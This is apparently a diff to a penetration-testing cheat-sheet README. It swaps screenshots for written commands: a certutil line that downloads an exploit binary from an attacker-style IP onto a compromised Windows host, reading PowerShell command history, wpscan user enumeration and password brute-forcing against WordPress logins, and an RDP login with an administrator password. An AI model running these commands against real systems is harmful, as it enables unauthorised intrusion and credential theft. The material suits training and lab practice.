-<img src="images/wfuzz_subdomain_enumeration.png">
+* `certutil -urlcache -f http://10.10.14.5/MS10-059.exe ms.exe`
 
-<p align="justify">In case you have to bypass AppLocker in Windows.</p>
+## Windows commands history check
+It's just like bash history in Linux.
 
-<img src="images/windows_bypass_applocker.png">
+* `c:\Users\<username>\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` this line opens up a notepad with the histroy of commands.
 
-<p align="justify">Windows file transfer, in case you have to bring a file over to the compromised Windows machine. The last piece of information is how do you want to name the file that your bring over.</p>
+## wpscan
+The best scanner for Wordpress sites.
 
-<img src="images/windows_file_transfer.png">
+* `wpscan --url http://<domain.com> -e u` to enumerate users
+* once we found some users we save their names in a file called *_users.txt_*
+* then we use a wordlist to find vulnerable passwords on found users: `wpscan -U /dev/shm/users.txt -P /usr/share/wordlist/fasttrack.txt --url http://<domain.com>`
 
-<p align="justify">Checking Windows PowerShell history of commmands, it's like bash_history in Linux.</p>
+## xfreerdp to RDP in onto a host
 
-<img src="images/windows_powershell_command_history.png">
+* `xfreerdp /u:administrator /p:letmein123! /v:<IP> /size:90&`
 
-<p align="justify">Whenever you encounter a juicy WordPress blog wpscan is there for you :) The first pic shows how to enumerate users, the second one takes the user names, saves it in a text file and use it with the wordlist fasttrack.txt against the website's login.</p>
+****
+### This is the end of the list, remember, it's not the commands, it's what you do with those commands and how do you use the information you get out of theses swites, that's all that matters. This repo is for educational purposes only, anything you do with this is on you, so be responsable.
 
-<p>Enumerating users with wpscan:</p>
-
-<img src="images/wpscan_enumerate_users.png">
-
-<p align="justify">Using a wordlist to find vulnerable passwords with wpscan:</p>
-
-<img src="images/wpscan_password_spaying.png">
-
-<p align="justify">How to connect to a remote desktop via xfreedp</p>
-
-<img src="images/xfreerdp_remote_desktop_connect.png">
-
-<p align="justify">Prepping a zip file with zip2john to crack it with john.</p>
-
-<img src="images/zip2john.png">
-
-
-<p align="justify">This is the end of the list, remember, it's not the commands, it's what you do with those commands and how do you use the information you get out of theses swites, that's all that matters. This repo is for educational purposes only, anything you do with this is on you, so be responsable.</p>
-
-<h2 align="center">The world is at your fingertips 💯</h2>
-
-<img src="images/004_hacker_hoodie.jpg">
-
-**Github, Twitter, LinkedIn:** @codetorok
+## The world is at your fingertips 💯
+![world100](images/004_hacker_hoodie.jpg)
